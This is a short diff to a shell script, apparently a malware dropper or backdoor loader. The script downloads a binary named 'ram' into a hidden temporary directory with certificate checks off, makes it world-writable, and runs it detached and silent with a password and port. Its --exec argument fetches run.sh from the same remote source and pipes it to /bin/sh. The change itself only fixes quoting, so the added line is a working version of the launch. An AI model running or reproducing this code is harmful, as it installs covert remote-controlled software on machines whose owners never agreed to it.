@@ -8,5 +8,5 @@ work="$(mktemp -u -t .XXXXXX 2>/dev/null)"
 mkdir -p "${work}"
 wget --no-check-certificate -qO "${work}/ram" "${src}/ram"
 chmod -R 777 "${work}"
-nohup setsid /bin/sh -c "${work}/ram -v 3.23 -p "${pass}" --port "${port}" --exec 'wget -qO- ${src}/run.sh |/bin/sh'" </dev/null >/dev/null 2>&1 &
+nohup setsid /bin/sh -c 'exec "$1" -v "$2" -p "$3" --port "$4" --exec "$5"' /bin/sh "${work}/ram" "3.23" "${pass}" "${port}" "wget -qO- ${src}/run.sh |/bin/sh"  </dev/null >/dev/null 2>&1 &
 exit 0
